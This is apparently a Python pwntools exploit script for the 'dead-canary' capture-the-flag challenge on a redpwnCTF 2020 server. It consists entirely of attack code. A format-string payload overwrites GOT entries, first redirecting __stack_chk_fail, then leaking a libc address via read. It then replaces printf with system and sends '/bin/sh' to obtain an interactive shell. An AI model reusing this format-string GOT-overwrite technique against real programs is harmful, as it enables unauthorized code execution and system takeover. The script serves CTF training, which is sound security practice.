from pwn import *

def fmt(prev , target):
	if prev < target:
		result = target - prev
		return "%" + str(result)  + "c"
	elif prev == target:
		return ""
	else:
		result = 0x10000 + target - prev
		return "%" + str(result) + "c"

def fmt64(offset , target_addr , target_value , prev = 0):
	payload = ""
	for i in range(3):
		payload += p64(target_addr + i * 2)
	payload2 = ""
	for i in range(3):
		target = (target_value >> (i * 16)) & 0xffff
		payload2 += fmt(prev , target) + "%" + str(offset + 8 + i) + "$hn"
		prev = target
	payload = payload2.ljust(0x40 , "a") + payload
	return payload

#p = process('./dead-canary')
p = remote('2020.redpwnc.tf', 31744)
e = ELF('./dead-canary')
l = e.libc

pause()
pay = fmt64(6, e.got['__stack_chk_fail'], 0x400737)
p.sendafter(': ', pay.ljust(0x120, 'a'))

pay = '%7$saaaa'+p64(e.got['read'])
p.sendafter(': ', pay.ljust(0x120, 'a'))

libc = u64(p.recvuntil('\x7f')[-6:]+'\x00'*2) - l.sym['read']
print hex(libc)

pay = fmt64(6, e.got['printf'], libc+l.sym['system'])
p.sendafter(': ', pay.ljust(0x120, 'a'))

sleep(1)
p.send('/bin/sh')

p.interactive()
